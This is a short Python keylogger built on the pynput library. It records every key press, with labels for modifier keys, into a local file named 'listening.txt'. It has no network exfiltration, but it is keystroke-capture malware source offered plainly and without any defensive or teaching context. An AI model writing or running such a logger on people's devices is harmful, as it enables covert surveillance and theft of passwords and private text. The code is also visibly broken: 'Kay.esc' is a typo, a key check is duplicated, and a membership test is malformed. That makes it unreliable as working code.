from pynput.keyboard import Listener, Key


def write_to_file(key):
    # Write to log file

    key_data = str(key).replace("'", "")

    print(key_data)
    print('{0} release'.format(key))
    if key == Kay.esc:
        print('entered escape')
        return False

    if key in (Key.shift, Key.shift_l, Key.shift_r,):
        key_data = ' Shift + '
    if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r,):
        key_data = ' Ctrl + '
    if key in (Key.cmd, Key.cmd, Key.cmd,):
        key_data = ' Command + '
    if key in (Key.space,):
        key_data = ' '
    if key in (Key.enter):
        key_data = '\n'

    try:
        with open('listening.txt', 'a') as fout:
            fout.write(key_data)
    except FileNotFoundError:
        with open('listening.txt', 'w') as fout:
            fout.write(key_data)


f = open('listening.txt', 'a')
f.write("Start of File")
f.close()
with Listener(on_press=write_to_file) as listener:
    listener.join()
